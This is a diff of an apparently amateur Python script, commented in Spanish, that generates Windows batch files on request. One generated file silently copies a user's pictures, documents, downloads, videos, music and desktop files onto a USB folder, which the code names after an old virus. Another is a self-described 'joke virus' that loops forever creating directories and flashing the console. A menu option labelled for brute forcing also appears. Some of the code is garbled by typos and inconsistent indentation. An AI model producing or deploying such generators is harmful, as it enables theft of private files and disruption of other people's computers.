@@ -5,6 +5,32 @@ import subprocess
 import getpass
 import os
 
+
+#///////////////////////////////////////////////////////////////////////////
+#  VARIABLES NECESARIAS:
+CONTENT1 ='''@echo off
+copy C:\Users\%USERNAME%\Pictures\*.* .\sofia\ 
+copy C:\Users\%USERNAME%\Destkop\*.* .\sofia\ 
+copy C:\Users\%USERNAME%\Downloads\*.* .\sofia\
+copy C:\Users\%USERNAME%\Documents\*.*.\sofia\ 
+copy C:\Users\%USERNAME%\Videos\*.*.\sofia\ 
+copy C:\Users\%USERNAME%\Music\*.* .\sofia\ '''
+CONTENT2 = '''@echo off
+:loop
+mkdir %random%
+color 20
+color 40
+color E0
+goto loop'''
+MSG1 = '''
+se va a crear un archivo.bat con un programa para copiar archivos 
+desde una usb...
+para que esto funcione debe de tener una usb con una carpeta llamada 'sofia'
+la cual se encuentre en el mismo directorio que el archivo que esta a punto de 
+crearse en la ruta {}'''.format(os.getcwd())
+MSG2 = "de momento solo hay un virus joke porque es muy tarde"
+#///////////////////////////////////////////////////////////////////////////
+
 def filefactory(msg, content):
 	subprocess.call(["cmd.exe","/c","cls"])
 	print('''{}'''.format(msg))
@@ -47,7 +73,7 @@ def bforce():
 				break
 	getpass.getpass("presione enter para continuar...")
 
-def run():
+def run(content1, content2, msg1, msg2):
 	do = str()
 	while do != 'exit':
 		subprocess.call(["cmd.exe","/c","cls"])
@@ -65,48 +91,16 @@ def run():
 		if do == "f":
 			bforce()
 		elif do == "s":
-			msg = '''
-			se va a crear un archivo.bat con un programa para copiar archivos desde una usb...
-            para que esto funcione debe de tener una usb con una carpeta llamada 'sofia'
-            la cual se encuentre en el mismo directorio que el archivo que esta a punto de crearse
-            en la ruta {}'''.format(os.getcwd())
-            #la carpeta se llama sofia en honor al virus para MS-DOS del mismo nombre
-            content = '''
-@echo off
-copy C:\Users\%USERNAME%\Pictures\*.* .\sofia\
-copy C:\Users\%USERNAME%\Destkop\*.* .\sofia\
-copy C:\Users\%USERNAME%\Downloads\*.* .\sofia\
-copy C:\Users\%USERNAME%\Documents\*.*.\sofia\
-copy C:\Users\%USERNAME%\Videos\*.*.\sofia\
-copy C:\Users\%USERNAME%\Music\*.* .\sofia\ '''
-            filefactory(msg, content)
-        elif do == "j":
-        	msg = "de momento solo hay un virus joke porque es muy tarde"
-        	content = '''
-@echo off 
-c: 
-cd C:\Users\%USERNAME%\Desktop 
-:loop1 
-MD soyununicornio%random% 
-echo soy un unicornio
-start https://es.wikipedia.org/wiki/Unicornio
-color 20 
-color 30 
-color 40 
-color 50 
-color E0  
-goto loop2 
-:loop2 
-goto loop1 
-
-        	'''
-        	filefactory(msg, content)
-        elif do == "c":
-        	print("esto lo voy a crear mañana")
+		   filefactory(msg1, content1)
+		elif do == "j":
+			filefactory(msg2, content2)
+		elif do == "c":
+			print("esto lo voy a crear mañana")
         	getpass.getpass("presione enter para continuar")
 
+
 if __name__ == '__main__':
-	run()
+	run(CONTENT1, CONTENT2, MSG1, MSG2)
 
 
 	
